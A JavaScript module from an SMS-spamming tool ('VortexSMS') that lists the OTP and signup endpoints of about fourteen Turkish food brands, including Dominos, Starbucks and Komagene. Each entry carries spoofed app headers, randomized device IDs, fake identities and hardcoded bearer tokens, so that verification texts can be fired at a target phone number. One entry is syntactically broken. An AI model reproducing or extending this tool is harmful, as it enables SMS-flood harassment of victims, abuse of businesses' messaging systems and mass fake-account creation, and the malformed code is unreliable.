/**
 * VortexSMS - Food Services
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { faker, randomPassword, randomFullName, randomFirstName, randomLastName, randomGenderTR, randomBirthDate, randomDeviceId, randomDeviceInfo } = require('../helpers');
const ServiceBuilder = require('../service-builder');

const foodServices = [
    // KahveDünyası
    ServiceBuilder.web('KahveDünyası', 
        'https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number',
        'https://www.kahvedunyasi.com',
        (phone) => ({
            countryCode: '90',
            phoneNumber: phone
        }),
        {
            headers: {
                'X-Language-Id': 'tr-TR',
                'X-Client-Platform': 'web',
                'Sec-Fetch-Site': 'same-site'
            }
        }
    ),

    // TiklaGelsin
    new ServiceBuilder('TiklaGelsin')
        .url('https://svc.apps.tiklagelsin.com:443/user/graphql')
        .headers({
            'Content-Type': 'application/json',
            'X-Merchant-Type': '0',
            Accept: '*/*',
            Appversion: '2.4.1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'X-No-Auth': 'true',
            'User-Agent': 'TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Device-Type': '2'
        },
        json: (phone) => ({
            operationName: 'GENERATE_OTP',
            query: 'mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n',
            variables: {
                challenge: randomDeviceId(),
                deviceUniqueId: randomDeviceId(),
                phone: '+90' + phone
            }
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Sakasu',
        url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
        method: 'POST',
        form: (phone) => ({
            phone: '0' + phone
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Happy',
        url: 'https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            Accept: 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            Origin: 'https://www.happy.com.tr',
            'User-Agent': (() => randomDeviceInfo().userAgent)(),
            Referer: 'https://www.happy.com.tr/index.php?route=account/register',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            Priority: 'u=0',
            Te: 'trailers'
        },
        json: (phone) => ({
            telephone: phone
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Komagene',
        url: 'https://gateway.komagene.com.tr:443/auth/auth/smskodugonder',
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            Referer: 'https://www.komagene.com.tr/',
            Anonymousclientid: '0dbf392b-ab10-48b3-5cda-31f3c19816e6',
            Firmaid: '32',
            'X-Guatamala-Kirsallari': '@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq',
            'Content-Type': 'application/json',
            Origin: 'https://www.komagene.com.tr',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            Priority: 'u=0',
            Te: 'trailers',
            Connection: 'keep-alive'
        },
        json: (phone) => ({
            FirmaId: 32,
            Telefon: phone
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'KuryemGelsin',
        url: 'https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/',
        method: 'POST',
        json: (phone) => ({
            phoneNumber: phone,
            phone_country_code: '+90'
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Starbucks',
        url: 'https://auth.sbuxtr.com:443/signUp',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            Operationchannel: 'ios',
            Accept: '*/*',
            'Accept-Encoding': 'gzip, deflate, br'
        },
        json: (phone) => {
            const firstName = randomFirstName();
            return {
                allowEmail: true,
                allowSms: true,
                deviceId: randomDeviceId(),
                email: faker.internet.email(),
                firstName: firstName,
                lastName: randomLastName(),
                password: randomPassword(),
                phoneNumber: phone,
                preferredName: firstName
            };
        },
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'BayDöner',
        url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            Accept: '*/*',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            Platform: '1',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        },
        json: (phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            const deviceId = randomDeviceId();
            const deviceInfo = randomDeviceInfo();
            return {
                AppVersion: '1.3.2',
                AreaCode: 90,
                City: 'ADANA',
                CityId: 1,
                Code: '',
                Culture: 'tr-TR',
                DeviceId: deviceId,
                DeviceModel: deviceInfo.DeviceModel,
                DeviceToken: deviceId.substring(0, 8),
                Email: faker.internet.email(),
                GDPRPolicy: false,
                Gender: randomGenderTR(),
                GenderId: Math.random() > 0.5 ? 1 : 2,
                LoyaltyProgram: false,
                merchantID: 5701,
                Method: '',
                Name: firstName,
                notificationCode: deviceId.substring(0, 8),
                NotificationToken: deviceId.substring(0, 8),
                OsSystem: deviceInfo.OsSystem,
                Password: randomPassword(),
                PhoneNumber: phone,
                Platform: 1,
                sessionID: deviceId.substring(0, 8),
                socialId: '',
                SocialMethod: '',
                Surname: lastName,
                TempId: Math.floor(Math.random() * 900000) + 100000,
                TermsAndConditions: false
            };
        },
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Pidem',
        url: 'https://restashop.azurewebsites.net:443/graphql/',
        method: 'POST',
        headers: {
            Accept: '*/*',
            Origin: 'https://pidem.azurewebsites.net',
            'Content-Type': 'application/json',
            Authorization: 'Bearer null',
            Referer: 'https://pidem.azurewebsites.net/',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'User-Agent': (() => randomDeviceInfo().userAgent)(),
            'Accept-Encoding': 'gzip, deflate, br'
        },
        json: (phone) => ({
            query: '\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n',
            variables: { phone: phone }
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Dominos',
        url: 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json;charset=utf-8',
            Accept: 'application/json, text/plain, */*',
            Authorization: 'Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg',
            'Device-Info': (() => {
                const deviceId = randomDeviceId();
                const deviceInfo = randomDeviceInfo();
                return `Unique-Info: ${deviceId} Model: ${deviceInfo.model} Brand-Info: Apple Build-Number: ${deviceInfo.buildNumber}.1.0 SystemVersion: ${deviceInfo.version}`;
            })(),
            Appversion: 'IOS-7.1.0',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'User-Agent': 'Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            Servicetype: 'CarryOut',
            Locationcode: 'undefined'
        },
        json: (phone) => ({
            email: faker.internet.email(),
            isSure: false,
            mobilePhone: phone
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'KofteciYusuf',
        url: 'https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json; charset=utf-8',
            Accept: 'application/json',
            Ostype: 'iOS',
            Appversion: '4.0.4.0',
            'Accept-Language': 'en-GB,en;q=0.9',
            Firmaid: '82',
            'X-Guatamala-Kirsallari': '@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq',
            'Accept-Encoding': 'gzip, deflate, br',
            Language: 'tr-TR',
            'User-Agent': 'YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        },
        json: (phone) => ({
            FireBaseCihazKey: null,
            FirmaId: 82,
            GuvenlikKodu: null,
            Telefon: phone
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'LittleCaesars',
        url: 'https://api.littlecaesars.com.tr:443/api/web/Member/Register',
        method: 'POST',
        headers: {
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json; charset=utf-8',
            Authorization: 'Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg',
            'X-Platform': 'ios',
            'X-Version': '1.0.0',
            'User-Agent': 'LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        },
        json: (phone) => ({
            CampaignInform: true,
            Email: faker.internet.email(),
            InfoRegister: true,
            IsLoyaltyApproved: true,
            NameSurname: randomFullName(),
            Password: randomPassword(),
            Phone: phone,
            SmsInform: true
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Coffy',
        url: 'https://user-api-gw.coffy.com.tr:443/user/signup',
        method: 'POST',
        headers: {
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            Language: 'tr',
            'User-Agent': 'coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            Token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA'
        },
        json: (phone) => ({
            countryCode: '90',
            gsm: phone,
            isKVKKAgreementApproved: true,
            isUserAgreementApproved: true,
            name: randomFullName()
        }),
        timeout: 6000,
        successCodes: [200]
    }
];

module.exports = foodServices;
